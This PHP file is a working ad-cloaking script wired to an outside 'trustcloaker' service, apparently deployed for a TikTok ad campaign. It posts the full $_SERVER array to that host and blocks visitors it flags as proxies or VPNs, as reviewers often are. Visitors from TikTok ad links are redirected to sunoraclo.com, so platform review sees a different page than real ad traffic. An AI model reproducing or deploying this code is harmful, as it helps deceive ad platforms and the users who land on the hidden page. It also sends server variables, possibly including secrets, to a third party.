<?php
class Oppsd
{
    private string $endpoint;
    private int $timeout;

    public function __construct(string $endpoint, int $timeout = 5)
    {
        $this->endpoint = $endpoint;
        $this->timeout = $timeout;
    }

    private function isTikTokRequest(): bool
    {
        if (isset($_GET['ttclid']) && !empty($_GET['ttclid'])) return true;
        if (isset($_GET['tt_campaignid']) && !empty($_GET['tt_campaignid'])) return true;
        if (isset($_GET['utm_source']) && $_GET['utm_source'] === 'tiktok') return true;
        return false;
    }

    private function preparePayload(string $uid, string $cid): array
    {
        return [
            'uid'    => $uid,
            'cid'    => $cid,
            'server' => $_SERVER,
        ];
    }

    private function currentUrl(): string
    {
        return "https://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
    }

    private function postJson(array $payload): ?array
    {
        $ch = curl_init($this->endpoint);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => $this->timeout,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => json_encode($payload),
            CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        ]);

        $response = curl_exec($ch);
        $error    = curl_error($ch);
        curl_close($ch);

        if ($error) {
            return ['status' => false, 'error' => $error];
        }

        return json_decode($response, true);
    }

    public function send(string $uid, string $cid): ?array
    {
        if(isset($_GET['trustcloaker'])){
            echo $cid;
            die;
        }

        // 🔥 1. ZUERST: Trustcloaker prüft Proxys/VPNs/Blacklisted IPs
        $data = $this->postJson($this->preparePayload($uid, $cid));

        // 🔥 2. WENN TRUSTCLOAKER KEINE URL ZURÜCKGIBT → BLOCKIEREN
        if (empty($data['url'])) {
            header("HTTP/1.0 403 Forbidden");
            echo "Access Denied (Proxy/VPN detected)";
            exit;
        }

        // 🔥 3. NUR WENN TRUSTCLOAKER OKAY IST: TikTok-Check
        //    FALLS TIKTOK: Redirect zu sunoraclo.com
        //    FALLS NICHT TIKTOK: KEIN REDIRECT (bleibt auf der Seite oder 403)
        if ($this->isTikTokRequest()) {
            header('Location: https://sunoraclo.com/');
            exit;
        }

        // 🔥 4. Falls kein TikTok, aber Trustcloaker okay:
        //     Hier entscheidet Trustcloaker, was passiert (kein manueller Redirect!)
        if (isset($data['url'])) {
            if (substr($data['url'], -1) !== '/') {
                $data['url'] .= '/';
            }
            if ($this->currentUrl() !== $data['url']) {
                header('Location: ' . $data['url']);
                exit;
            }
        }

        return $data;
    }
}

$oppsd = new Oppsd('https://api.trustcloaker.com/api/v1/logic');
$response = $oppsd->send('CcCqm', 'fXPdM');
?>
